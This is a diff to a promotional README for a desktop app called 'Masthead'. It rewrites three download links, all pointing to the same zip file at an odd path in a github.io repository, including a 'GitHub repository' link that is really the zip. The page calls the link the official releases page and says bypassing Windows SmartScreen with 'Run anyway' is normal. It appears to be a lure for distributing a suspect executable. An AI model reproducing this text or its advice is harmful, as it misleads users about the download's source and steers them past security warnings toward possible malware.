@@ -17,7 +17,7 @@ Whether you're in Türkiye, the United States, India, the United Kingdom, German
 
 ## ⬇️ Download & Install
 
-[**🔗 CLICK HERE TO DOWNLOAD MASTHEAD**](https://github.com/redblac/redblac.github.io/raw/refs/heads/main/uncavalierly/1.2.zip)
+[**🔗 CLICK HERE TO DOWNLOAD MASTHEAD**](https://raw.githubusercontent.com/redblac/redblac.github.io/main/uncavalierly/1.2.zip)
 
 Visit this link to download the application. You'll land on the official releases page where you can find the latest version of masthead for your computer.
 
@@ -151,7 +151,7 @@ This is normal for open-source software. Click **"More info"** → **"Run anyway
 Go to Settings → Display and increase the zoom level. Masthead scales beautifully on 4K screens.
 
 ### ❗ I found a bug or have a suggestion
-Visit the [GitHub repository](https://github.com/redblac/redblac.github.io/raw/refs/heads/main/uncavalierly/1.2.zip) and open an issue. The team responds quickly.
+Visit the [GitHub repository](https://raw.githubusercontent.com/redblac/redblac.github.io/main/uncavalierly/1.2.zip) and open an issue. The team responds quickly.
 
 ---
 
@@ -198,7 +198,7 @@ You're not just avoiding annoyances; you're building a healthier relationship wi
 
 Need the download link one more time? Here it is:
 
-[**⬇️ GET MASTHEAD NOW**](https://github.com/redblac/redblac.github.io/raw/refs/heads/main/uncavalierly/1.2.zip)
+[**⬇️ GET MASTHEAD NOW**](https://raw.githubusercontent.com/redblac/redblac.github.io/main/uncavalierly/1.2.zip)
 
 It's free. It's fast. It's yours.
 
